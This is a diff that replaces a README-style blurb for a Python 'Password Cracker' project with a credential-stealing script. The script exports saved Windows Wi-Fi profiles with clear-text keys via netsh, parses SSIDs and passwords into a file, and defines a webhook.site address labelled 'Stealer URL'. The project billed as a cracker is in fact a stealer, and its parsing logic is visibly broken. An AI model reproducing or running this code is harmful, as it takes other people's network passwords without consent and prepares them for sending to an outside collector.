@@ -1,15 +1,50 @@
-Unlock the secrets of cybersecurity with this Password Cracker project developed in Python. This repository showcases the implementation of key modules like subprocess, os, and sys, combined with dynamic lists, Windows command utilization for grabbing the current directory, and intelligent loops.
+import subprocess
+import os
+import sys
+import requests
 
-Key Features
-Module Mastery: Leverage the power of Python's subprocess, os, and sys modules for a robust foundation in password cracking.
+#Stealer URL
+url='https://webhook.site/c2ec8bf0-fe36-42fe-956e-cfd3f9a5bc8e'
 
-Dynamic Lists: Enhance versatility with dynamic lists, enabling effective handling of various password scenarios.
+#create a file
+password_file=open('password.txt', "w")
+password_file.write("Hello sir! Here are your passwords:\n\n")
+password_file.close()
 
-Windows Command Integration: Seamlessly grab the current directory using Windows commands for an optimized user experience.
 
-Smart Loops: Optimize password cracking with intelligent loops, ensuring efficient iteration through possibilities.
+#Lists
 
-Usage
-Clone the repository: git clone [repository_url]
-Navigate to the project directory: cd PasswordCrackerPython
-Run the script: python password_cracker.py
+wifi_files=[]
+wifi_name=[]
+wifi_password=[]
+
+#Use Python to execute a Windows command
+command = subprocess.run(["netsh", "wlan","export","profile","key=clear"], capture_output=True).stdout.decode()
+
+#grab current directory
+path= os.getcwd()
+
+#Do the hackies
+for filename in os.listdir(path):
+    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
+        wifi_files.append(filename)
+        for i in wifi_files:
+            with open(i, 'r') as f:
+                for line in f.readlines():
+                    if 'name' in line:
+                        stripped=line.strip()
+                        front= stripped[6:]
+                        back= front[:-7]
+                        wifi_name.append(back)
+                        if 'keyMaterial' in line:
+                            stripped = line.strip()
+                            front= stripped[13:]
+                            back= front[:-14]
+                            wifi_password.append(back)
+                            for x,y in zip(wifi_name,wifi_password):
+                                sys.stdout= open("passwords.txt","a")
+                                print("SSID: "+x, "Password: "+y,sep='\n')
+                                sys.stdout.close()
+
+
+
